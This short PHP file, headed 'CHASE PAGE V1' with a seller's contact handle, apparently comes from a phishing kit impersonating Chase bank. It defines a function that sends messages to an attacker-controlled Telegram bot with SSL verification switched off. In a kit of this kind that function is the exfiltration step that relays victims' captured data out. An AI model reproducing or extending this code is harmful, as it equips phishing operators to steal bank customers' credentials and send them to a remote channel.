<?php
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
function telegram_message($message,$telegram_token,$telegram_chatid) {
	$curl = curl_init();
	$format   = 'HTML';
	curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $telegram_token .'/sendMessage?chat_id='. $telegram_chatid .'&text='. urlencode($message) .'&parse_mode=' . $format);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
	$result = curl_exec($curl);
	curl_close($curl);
	return true;
}
?>